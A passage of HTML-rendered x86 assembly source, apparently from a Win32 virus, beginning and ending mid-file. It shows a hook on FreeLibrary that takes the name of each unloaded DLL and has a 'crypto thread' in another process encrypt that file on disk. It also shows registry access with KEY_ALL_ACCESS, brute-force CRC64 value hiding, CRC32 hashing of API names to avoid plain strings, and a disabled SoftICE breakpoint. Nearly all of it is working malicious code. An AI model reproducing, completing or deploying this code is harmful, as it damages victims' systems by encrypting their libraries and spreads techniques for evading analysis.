</span><span class="sc1">;ÄÄÄ´ cryptography thread ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is true Cryptography thread which can run some common</span><span class="sc0">
        </span><span class="sc1">;functions, because crypto functions allocated memory ain't</span><span class="sc0">
        </span><span class="sc1">;shared, so I must use this thread.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;    crypto_thread ... CT_LOADKEY     - crypt_loadKey func</span><span class="sc0">
        </span><span class="sc1">;          ... CT_CRYPTFILE   - crypt_file function</span><span class="sc0">
        </span><span class="sc1">;          ... CT_DECRYPTFILE - decrypt_file function</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:</span><span class="sc0">
        </span><span class="sc1">;    crypto_thread_err ... lastError flag</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_thread</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers &amp; get delta offset</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

        </span><span class="sc1">; get thread action</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CT_LOADKEY</span><span class="sc0">      </span><span class="sc1">;crypt_loadKey</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">crypt_loadKey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CT_CRYPTFILE</span><span class="sc0">    </span><span class="sc1">;crypt_file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">crypt_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CT_DECRYPTFILE</span><span class="sc0">  </span><span class="sc1">;decrypt_file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">decrypt_file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ct_finish_all</span><span class="sc0">     </span><span class="sc1">;bad input parameter</span><span class="sc0">

        </span><span class="sc1">; set (C)arry and EAX</span><span class="sc0">
    </span><span class="sc5">__ct_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc5">__ct_finish_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;wait for a while</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSleep</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">crypt_thread</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ get FileName of library ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is  called from "FreeLibrary" function. Be-</span><span class="sc0">
        </span><span class="sc1">;cause FL parameter is place in memory, I have to  get its</span><span class="sc0">
        </span><span class="sc1">;filename to crypt that.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Behaviour:</span><span class="sc0">
        </span><span class="sc1">;  * get filename from handle (FreeLibrary parameter)</span><span class="sc0">
        </span><span class="sc1">;  * check DLL name (might I crypt u ?)</span><span class="sc0">
        </span><span class="sc1">;  * run FreeLibrary function (file was closed)</span><span class="sc0">
        </span><span class="sc1">;  * get process where I created "crypto thread"</span><span class="sc0">
        </span><span class="sc1">;  * crypt file (by thread: CT_CRYPTFILE flag)</span><span class="sc0">
        </span><span class="sc1">;  * go back (two ways: success OR failed)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_get_library</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; get FileName of the module</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;input parameter for Free-</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000054h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Library function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetModuleFileNameA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; check whether I can crypt that file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_DLL_check</span><span class="sc0">

    </span><span class="sc5">__final_SoftICE_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;        int     4           ;final SoftICE breakpoint</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cgl_finish</span><span class="sc0">

        </span><span class="sc1">; free library from memory</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;ehm :)</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;FreeLibrary function, huh?</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; crypt that file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">        </span><span class="sc1">;damn bug !</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cgl_finish2</span><span class="sc0">       </span><span class="sc1">;other process ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc5">CT_CRYPTFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mainProcId</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;active process where I cre-</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;ated my thread, I cannot</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;active my thread from other</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddOpenProcess</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;process then where was cre-</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ated</span><span class="sc0">
    </span><span class="sc5">__cgl_cCryptFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">          </span><span class="sc1">;active crypto thread</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWaitForSingleObject</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cgl_cCryptFile</span><span class="sc0">    </span><span class="sc1">;crypto thread must crypt DLL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc5">__cgl_finish2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;go back, my lord !</span><span class="sc0">

    </span><span class="sc5">__cgl_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__hif_finish</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ common register functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">__regOpen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; open certain register class</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... address of register handle</span><span class="sc0">
            </span><span class="sc1">;     ECX ... reg (HKEY_CURRENT_USER, HKEY_*, ...)</span><span class="sc0">
            </span><span class="sc1">;     ESI ... register class</span><span class="sc0">
            </span><span class="sc1">;   output:</span><span class="sc0">
            </span><span class="sc1">;     (C)flags</span><span class="sc0">
            </span><span class="sc1">;     EAX ... is NOT modified</span><span class="sc0">
            </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">               </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;address of register handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F003Fh</span><span class="sc0">       </span><span class="sc1">;flag: KEY_ALL_ACCESS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;register class</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;reg id</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;fault ?</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;restore registers</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cReg_fault</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__cReg_fault</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ functions to calculate brute-CRC64 and CRC32 for APIs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function tries to calculate "brute-CRC64" value for</span><span class="sc0">
        </span><span class="sc1">;certain buffer when the first two valuez won't know. So,</span><span class="sc0">
        </span><span class="sc1">;I won't generate DWORD because this operation is very</span><span class="sc0">
        </span><span class="sc1">;difficult for CPU but instead this I'll encode two WORDs.</span><span class="sc0">
        </span><span class="sc1">;For DLL encrypting i use this method but for PPE-II I'll</span><span class="sc0">
        </span><span class="sc1">;generate DWORD.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    ESI ... source data</span><span class="sc0">
        </span><span class="sc1">;        ECX ... defined data in buffer ESI</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:   EAX ... my low  "brute-CRC64" value</span><span class="sc0">
        </span><span class="sc1">;        EDX ... my high "brute-CRC64" value</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__bruteCRC64</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;next WORD</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__bCRC64_calculate</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save the 1st "CRC64" value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__bCRC64_calculate</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__bCRC64_calculate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;clear registers</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__bCRC64_next_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;load next byte</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">__bCRC64_next_bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;set (c)arry ?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__bCRC64_no_changes</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0C1A7F39Ah</span><span class="sc0">      </span><span class="sc1">;ahhh, special valuez</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">09C3B248Eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc5">__bCRC64_no_changes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;next bit ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__bCRC64_next_bit</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__bCRC64_next_byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;low value to EAX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function wants to get right value which 's been lost</span><span class="sc0">
        </span><span class="sc1">;Thru "brute-attack" method.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    ESI ... input buffer</span><span class="sc0">
        </span><span class="sc1">;        ECX ... number of bytes in buffer with l.value</span><span class="sc0">
        </span><span class="sc1">;        EAX ... low  generated "brute-CRC64" value</span><span class="sc0">
        </span><span class="sc1">;        EDX ... high generated "brute-CRC64" value</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:   EAX ... original value</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__get_bruteCRC64</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">;clear original value to zero</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;save generated "brute-CRC64"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save POS and COUNTER</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;the second value</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc5">__g_bCRC64_second_word</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save POS and COUNTER</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__bCRC64_calculate</span><span class="sc0">  </span><span class="sc1">;check its "brute-CRC64"</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;increase original value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;ahhh, what's now ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__g_bCRC64_second_word</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;decrease original value</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;start of the 1st value</span><span class="sc0">
    </span><span class="sc5">__g_bCRC64_first_value</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save POS and COUNTER</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__bCRC64_calculate</span><span class="sc0">  </span><span class="sc1">;calculate its "brute-CRC64"</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;increase original value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;ahhh, what's now ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__g_bCRC64_first_value</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;decrease original value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;take away CRC64</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function calculates CRC32 for name of API functions.</span><span class="sc0">
        </span><span class="sc1">;The code has been stolen from LoRez source, hi mLapse :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__mCRC32</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0C1A7F39Ah</span><span class="sc0">
        </span><span class="sc5">__mCRC32_init</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">09C3B248Eh</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__macro_CRC32</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string</span><span class="sc0">
        </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">__mCRC32_init</span><span class="sc0">
        </span><span class="sc9">irpc</span><span class="sc0">    </span><span class="sc5">_x</span><span class="sc4">,&lt;</span><span class="sc5">string</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'&amp;_x&amp;'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc9">rept</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__mCRC32</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">
        </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">ctrlByte</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">crcReg</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;I don't compare API stringz in kernel32 but CRC32.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    ESI ... string</span><span class="sc0">
        </span><span class="sc1">;  output:   EAX ... CRC32</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__get_CRC32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">__mCRC32_init</span><span class="sc0">
    </span><span class="sc5">__gCRC32_next_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
